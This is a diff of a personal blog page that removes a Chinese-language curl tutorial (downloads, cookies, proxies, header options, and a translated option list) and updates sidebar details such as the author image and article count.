-<h2 id="0x02-保存访问的网页"><a href="#0x02-保存访问的网页" class="headerlink" title="0x02 保存访问的网页"></a>0x02 保存访问的网页</h2><h3 id="2-1-使用linux重定向功能保存"><a href="#2-1-使用linux重定向功能保存" class="headerlink" title="2.1 使用linux重定向功能保存"></a>2.1 使用linux重定向功能保存</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://www.baidu.com &gt;&gt; baidu.html</span><br></pre></td></tr></table></figure>
-<h3 id="2-2-可以使用curl的内置option-o-小写-保存网页"><a href="#2-2-可以使用curl的内置option-o-小写-保存网页" class="headerlink" title="2.2 可以使用curl的内置option:-o(小写)保存网页"></a>2.2 可以使用curl的内置option:-o(小写)保存网页</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -o linux.html http://www.linux.com</span><br></pre></td></tr></table></figure>
-<p>执行完成后会显示如下界面，显示100%则表示保存成功<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% Total    % Received % Xferd  Average Speed  Time    Time    Time  Current</span><br><span class="line">                                Dload  Upload  Total  Spent    Left  Speed</span><br><span class="line"><span class="number">100</span> <span class="number">79684</span>    <span class="number">0</span> <span class="number">79684</span>    <span class="number">0</span>    <span class="number">0</span>  <span class="number">3437</span>k      <span class="number">0</span> --:--:-- --:--:-- --:--:-- <span class="number">7781</span>k</span><br></pre></td></tr></table></figure></p>
-<h3 id="2-3-可以使用curl的内置option-O-大写-保存网页中的文件"><a href="#2-3-可以使用curl的内置option-O-大写-保存网页中的文件" class="headerlink" title="2.3 可以使用curl的内置option:-O(大写)保存网页中的文件"></a>2.3 可以使用curl的内置option:-O(大写)保存网页中的文件</h3><p>要注意这里后面的url要具体到某个文件，不然抓不下来<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -O http://www.linux.com/hello.sh</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x03-测试网页返回值"><a href="#0x03-测试网页返回值" class="headerlink" title="0x03 测试网页返回值"></a>0x03 测试网页返回值</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -o /dev/null -s -w %&#123;http_code&#125; www.baidu.com</span><br></pre></td></tr></table></figure>
-<p>Ps:在脚本中，这是很常见的测试网站是否正常的用法</p>
-<h2 id="0x04-指定proxy服务器以及其端口"><a href="#0x04-指定proxy服务器以及其端口" class="headerlink" title="0x04 指定proxy服务器以及其端口"></a>0x04 指定proxy服务器以及其端口</h2><p>很多时候上网需要用到代理服务器(比如是使用代理服务器上网或者因为使用curl别人网站而被别人屏蔽IP地址的时候)，幸运的是curl通过使用内置option：-x来支持设置代理</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -x <span class="number">192.168</span><span class="number">.100</span><span class="number">.100</span>:<span class="number">1080</span> http://www.linux.com</span><br></pre></td></tr></table></figure>
-<h2 id="0x05-cookie"><a href="#0x05-cookie" class="headerlink" title="0x05 cookie"></a>0x05 cookie</h2><p>有些网站是使用cookie来记录session信息。对于chrome这样的浏览器，可以轻易处理cookie信息，但在curl中只要增加相关参数也是可以很容易的处理cookie</p>
-<h3 id="5-1-保存http的response里面的cookie信息"><a href="#5-1-保存http的response里面的cookie信息" class="headerlink" title="5.1 保存http的response里面的cookie信息"></a>5.1 保存http的response里面的cookie信息</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -c cookiec.txt  http://www.linux.com</span><br></pre></td></tr></table></figure>
-<p>执行后cookie信息就被存到了cookiec.txt里面了</p>
-<h3 id="5-2-保存http的response里面的header信息"><a href="#5-2-保存http的response里面的header信息" class="headerlink" title="5.2 保存http的response里面的header信息"></a>5.2 保存http的response里面的header信息</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -D cookied.txt http://www.linux.com</span><br></pre></td></tr></table></figure>
-<p>执行后cookie信息就被存到了cookied.txt里面了</p>
-<p>注意：-c(小写)产生的cookie和-D里面的cookie是不一样的。</p>
-<h3 id="5-3-使用cookie"><a href="#5-3-使用cookie" class="headerlink" title="5.3 使用cookie"></a>5.3 使用cookie</h3><p>很多网站都是通过监视你的cookie信息来判断你是否按规矩访问他们的网站的，因此我们需要使用保存的cookie信息。内置option: -b<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b cookiec.txt http://www.linux.com</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x06-模范浏览器"><a href="#0x06-模范浏览器" class="headerlink" title="0x06 模范浏览器"></a>0x06 模范浏览器</h2><p>有些网站需要使用特定的浏览器去访问他们，有些还需要使用某些特定的版本。curl内置option:-A可以让我们指定浏览器去访问网站</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -A <span class="string">"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.0)"</span> http://www.linux.com</span><br></pre></td></tr></table></figure>
-<p>这样服务器端就会认为是使用IE8.0去访问的</p>
-<h2 id="0x07-伪造refer-盗链"><a href="#0x07-伪造refer-盗链" class="headerlink" title="0x07 伪造refer(盗链)"></a>0x07 伪造refer(盗链)</h2><p>很多服务器会检查http访问的referer从而来控制访问。比如：你是先访问首页，然后再访问首页中的邮箱页面，这里访问邮箱的referer地址就是访问首页成功后的页面地址，如果服务器发现对邮箱页面访问的referer地址不是首页的地址，就断定那是个盗链了。</p>
-<p>curl中内置option：-e可以让我们设定referer</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -e <span class="string">"www.linux.com"</span> http://mail.linux.com</span><br></pre></td></tr></table></figure>
-<p>这样就会让服务器其以为你是从<a href="http://www.linux.com点击某个链接过来的" target="_blank" rel="noopener">www.linux.com点击某个链接过来的</a></p>
-<h2 id="0x08-下载文件"><a href="#0x08-下载文件" class="headerlink" title="0x08 下载文件"></a>0x08 下载文件</h2><h3 id="8-1-利用curl下载文件。"><a href="#8-1-利用curl下载文件。" class="headerlink" title="8.1 利用curl下载文件。"></a>8.1 利用curl下载文件。</h3><p>使用内置option：-o(小写)<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -o dodo1.jpg http:www.linux.com/dodo1.JPG</span><br></pre></td></tr></table></figure></p>
-<p>使用内置option：-O（大写)<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -O http://www.linux.com/dodo1.JPG</span><br></pre></td></tr></table></figure></p>
-<p>这样就会以服务器上的名称保存文件到本地</p>
-<h3 id="8-2-循环下载"><a href="#8-2-循环下载" class="headerlink" title="8.2 循环下载"></a>8.2 循环下载</h3><p>有时候下载图片可以能是前面的部分名称是一样的，就最后的尾椎名不一样</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  curl -O http://www.linux.com/dodo[<span class="number">1</span><span class="number">-5</span>].JPG</span><br></pre></td></tr></table></figure>
-<p>这样就会把dodo1，dodo2，dodo3，dodo4，dodo5全部保存下来</p>
-<h3 id="8-3-下载重命名"><a href="#8-3-下载重命名" class="headerlink" title="8.3 下载重命名"></a>8.3 下载重命名</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -O http://www.linux.com/&#123;hello,bb&#125;/dodo[<span class="number">1</span><span class="number">-5</span>].JPG</span><br></pre></td></tr></table></figure>
-<p>由于下载的hello与bb中的文件名都是dodo1，dodo2，dodo3，dodo4，dodo5。因此第二次下载的会把第一次下载的覆盖，这样就需要对文件进行重命名。</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -o <span class="comment">#1_#2.JPG http://www.linux.com/&#123;hello,bb&#125;/dodo[1-5].JPG</span></span><br></pre></td></tr></table></figure>
-<p>这样在hello/dodo1.JPG的文件下载下来就会变成hello_dodo1.JPG,其他文件依此类推，从而有效的避免了文件被覆盖</p>
-<h3 id="8-4-分块下载"><a href="#8-4-分块下载" class="headerlink" title="8.4 分块下载"></a>8.4 分块下载</h3><p>有时候下载的东西会比较大，这个时候我们可以分段下载。使用内置option：-r</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -r <span class="number">0</span><span class="number">-100</span> -o dodo1_part1.JPG http://www.linux.com/dodo1.JPG</span><br><span class="line">$ curl -r <span class="number">100</span><span class="number">-200</span> -o dodo1_part2.JPG http://www.linux.com/dodo1.JPG</span><br><span class="line">$ curl -r <span class="number">200</span>- -o dodo1_part3.JPG http://www.linux.com/dodo1.JPG</span><br><span class="line">$ cat dodo1_part* &gt; dodo1.JPG</span><br></pre></td></tr></table></figure>
-<h3 id="8-5-通过ftp下载文件"><a href="#8-5-通过ftp下载文件" class="headerlink" title="8.5 通过ftp下载文件"></a>8.5 通过ftp下载文件</h3><p>curl可以通过ftp下载文件，curl提供两种从ftp中下载的语法</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -O -u 用户名:密码 ftp://www.linux.com/dodo1.JPG</span><br><span class="line">$ curl -O ftp://用户名:密码@www.linux.com/dodo1.JPG</span><br></pre></td></tr></table></figure>
-<h2 id="0x09-断点续传"><a href="#0x09-断点续传" class="headerlink" title="0x09 断点续传"></a>0x09 断点续传</h2><p>在windows中，我们可以使用迅雷这样的软件进行断点续传。curl可以通过内置option:-C同样可以达到相同的效果<br>如果在下载dodo1.JPG的过程中突然掉线了，可以使用以下的方式续传<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  curl -C -O http://www.linux.com/dodo1.JPG</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x0A-上传文件"><a href="#0x0A-上传文件" class="headerlink" title="0x0A 上传文件"></a>0x0A 上传文件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl不仅仅可以下载文件，还可以上传文件。通过内置option:-T来实现</span><br></pre></td></tr></table></figure>
-<p>这样就向ftp服务器上传了文件dodo1.JPG</p>
-<h2 id="0x0B-显示抓取错误"><a href="#0x0B-显示抓取错误" class="headerlink" title="0x0B 显示抓取错误"></a>0x0B 显示抓取错误</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -f http://www.linux.com/error</span><br></pre></td></tr></table></figure>
-<h1 id="其余参数"><a href="#其余参数" class="headerlink" title="其余参数"></a>其余参数</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">-a/--append                        上传文件时，附加到目标文件</span><br><span class="line">--anyauth                            可以使用“任何”身份验证方法</span><br><span class="line">--basic                                使用HTTP基本验证</span><br><span class="line">-B/--use-ascii                      使用ASCII文本传输</span><br><span class="line">-d/--data &lt;data&gt;                  HTTP POST方式传送数据</span><br><span class="line">--data-ascii &lt;data&gt;            以ascii的方式post数据</span><br><span class="line">--data-binary &lt;data&gt;          以二进制的方式post数据</span><br><span class="line">--negotiate                          使用HTTP身份验证</span><br><span class="line">--digest                        使用数字身份验证</span><br><span class="line">--disable-eprt                  禁止使用EPRT或LPRT</span><br><span class="line">--disable-epsv                  禁止使用EPSV</span><br><span class="line">--egd-file &lt;file&gt;              为随机数据(SSL)设置EGD socket路径</span><br><span class="line">--tcp-nodelay                  使用TCP_NODELAY选项</span><br><span class="line">-E/--cert &lt;cert[:passwd]&gt;      客户端证书文件和密码 (SSL)</span><br><span class="line">--cert-type &lt;type&gt;              证书文件类型 (DER/PEM/ENG) (SSL)</span><br><span class="line">--key &lt;key&gt;                    私钥文件名 (SSL)</span><br><span class="line">--key-type &lt;type&gt;              私钥文件类型 (DER/PEM/ENG) (SSL)</span><br><span class="line">--<span class="keyword">pass</span>  &lt;<span class="keyword">pass</span>&gt;                  私钥密码 (SSL)</span><br><span class="line">--engine &lt;eng&gt;                  加密引擎使用 (SSL). <span class="string">"--engine list"</span> <span class="keyword">for</span> list</span><br><span class="line">--cacert &lt;file&gt;                CA证书 (SSL)</span><br><span class="line">--capath &lt;directory&gt;            CA目   (made using c_rehash) to verify peer against (SSL)</span><br><span class="line">--ciphers &lt;list&gt;                SSL密码</span><br><span class="line">--compressed                    要求返回是压缩的形势 (using deflate <span class="keyword">or</span> gzip)</span><br><span class="line">--connect-timeout &lt;seconds&gt;    设置最大请求时间</span><br><span class="line">--create-dirs                  建立本地目录的目录层次结构</span><br><span class="line">--crlf                          上传是把LF转变成CRLF</span><br><span class="line">--ftp-create-dirs              如果远程目录不存在，创建远程目录</span><br><span class="line">--ftp-method [multicwd/nocwd/singlecwd]    控制CWD的使用</span><br><span class="line">--ftp-pasv                      使用 PASV/EPSV 代替端口</span><br><span class="line">--ftp-skip-pasv-ip              使用PASV的时候,忽略该IP地址</span><br><span class="line">--ftp-ssl                      尝试用 SSL/TLS 来进行ftp数据传输</span><br><span class="line">--ftp-ssl-reqd                  要求用 SSL/TLS 来进行ftp数据传输</span><br><span class="line">-F/--form &lt;name=content&gt;        模拟http表单提交数据</span><br><span class="line">-form-string &lt;name=string&gt;      模拟http表单提交数据</span><br><span class="line">-g/--globoff                    禁用网址序列和范围使用&#123;&#125;和[]</span><br><span class="line">-G/--get                        以get的方式来发送数据</span><br><span class="line">-h/--help                      帮助</span><br><span class="line">-H/--header &lt;line&gt;              自定义头信息传递给服务器</span><br><span class="line">--ignore-content-length        忽略的HTTP头信息的长度</span><br><span class="line">-i/--include                    输出时包括protocol头信息</span><br><span class="line">-I/--head                      只显示文档信息</span><br><span class="line">-j/--junk-session-cookies      读取文件时忽略session cookie</span><br><span class="line">--interface &lt;interface&gt;        使用指定网络接口/地址</span><br><span class="line">--krb4 &lt;level&gt;                  使用指定安全级别的krb4</span><br><span class="line">-k/--insecure                  允许不使用证书到SSL站点</span><br><span class="line">-K/--config                    指定的配置文件读取</span><br><span class="line">-l/--list-only                  列出ftp目录下的文件名称</span><br><span class="line">--limit-rate &lt;rate&gt;            设置传输速度</span><br><span class="line">--local-port&lt;NUM&gt;              强制使用本地端口号</span><br><span class="line">-m/--max-time &lt;seconds&gt;        设置最大传输时间</span><br><span class="line">--max-redirs &lt;num&gt;              设置最大读取的目录数</span><br><span class="line">--max-filesize &lt;bytes&gt;          设置最大下载的文件总量</span><br><span class="line">-M/--manual                    显示全手动</span><br><span class="line">-n/--netrc                      从netrc文件中读取用户名和密码</span><br><span class="line">--netrc-optional                使用 .netrc 或者 URL来覆盖-n</span><br><span class="line">--ntlm                          使用 HTTP NTLM 身份验证</span><br><span class="line">-N/--no-buffer                  禁用缓冲输出</span><br><span class="line">-p/--proxytunnel                使用HTTP代理</span><br><span class="line">--proxy-anyauth                选择任一代理身份验证方法</span><br><span class="line">--proxy-basic                  在代理上使用基本身份验证</span><br><span class="line">--proxy-digest                  在代理上使用数字身份验证</span><br><span class="line">--proxy-ntlm                    在代理上使用ntlm身份验证</span><br><span class="line">-P/--ftp-port &lt;address&gt;        使用端口地址，而不是使用PASV</span><br><span class="line">-Q/--quote &lt;cmd&gt;                文件传输前，发送命令到服务器</span><br><span class="line">--range-file                    读取（SSL）的随机文件</span><br><span class="line">-R/--remote-time                在本地生成文件时，保留远程文件时间</span><br><span class="line">--retry &lt;num&gt;                  传输出现问题时，重试的次数</span><br><span class="line">--retry-delay &lt;seconds&gt;        传输出现问题时，设置重试间隔时间</span><br><span class="line">--retry-max-time &lt;seconds&gt;      传输出现问题时，设置最大重试时间</span><br><span class="line">-S/--show-error                显示错误</span><br><span class="line">--socks4 &lt;host[:port]&gt;          用socks4代理给定主机和端口</span><br><span class="line">--socks5 &lt;host[:port]&gt;          用socks5代理给定主机和端口</span><br><span class="line">-t/--telnet-option &lt;OPT=val&gt;    Telnet选项设置</span><br><span class="line">--trace &lt;file&gt;                  对指定文件进行debug</span><br><span class="line">--trace-ascii &lt;file&gt;            Like --跟踪但没有hex输出</span><br><span class="line">--trace-time                    跟踪/详细输出时，添加时间戳</span><br><span class="line">--url &lt;URL&gt;                    Spet URL to work <span class="keyword">with</span></span><br><span class="line">-U/--proxy-user &lt;user[:password]&gt;  设置代理用户名和密码</span><br><span class="line">-V/--version                    显示版本信息</span><br><span class="line">-X/--request &lt;command&gt;          指定什么命令</span><br><span class="line">-y/--speed-time                放弃限速所要的时间。默认为<span class="number">30</span></span><br><span class="line">-Y/--speed-limit                停止传输速度的限制，速度时间<span class="string">'秒</span></span><br><span class="line"><span class="string">-z/--time-cond                  传送时间设置</span></span><br><span class="line"><span class="string">-0/--http1.0                    使用HTTP 1.0</span></span><br><span class="line"><span class="string">-1/--tlsv1                      使用TLSv1（SSL）</span></span><br><span class="line"><span class="string">-2/--sslv2                      使用SSLv2的（SSL）</span></span><br><span class="line"><span class="string">-3/--sslv3                      使用的SSLv3（SSL）</span></span><br><span class="line"><span class="string">--3p-quote                      like -Q for the source URL for 3rd party transfer</span></span><br><span class="line"><span class="string">--3p-url                        使用url，进行第三方传送</span></span><br><span class="line"><span class="string">--3p-user                      使用用户名和密码，进行第三方传送</span></span><br><span class="line"><span class="string">-4/--ipv4                      使用IP4</span></span><br><span class="line"><span class="string">-6/--ipv6                      使用IP6</span></span><br></pre></td></tr></table></figure>
-<p>参考文章：<br><a href="https://www.cnblogs.com/duhuo/p/5695256.html" target="_blank" rel="noopener">https://www.cnblogs.com/duhuo/p/5695256.html</a><br><a href="http://www.linuxdiyf.com/linux/2800.html" target="_blank" rel="noopener">http://www.linuxdiyf.com/linux/2800.html</a></p>
-
-          
+          <!--/noindex-->
         
       
     </div>
@@ -2085,6 +1980,8 @@
 
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
   
+    <img class="site-author-image" itemprop="image" src="/images/name.png" alt="cookie">
+  
   <p class="site-author-name" itemprop="name">cookie</p>
   <div class="site-description motion-element" itemprop="description"></div>
 </div>
@@ -2096,7 +1993,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">69</span>
+          <span class="site-state-item-count">70</span>
           <span class="site-state-item-name">Artikel</span>
         </a>
       </div>
@@ -2180,6 +2077,8 @@
     
       <div class="back-to-top">
         <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
         
       </div>
     
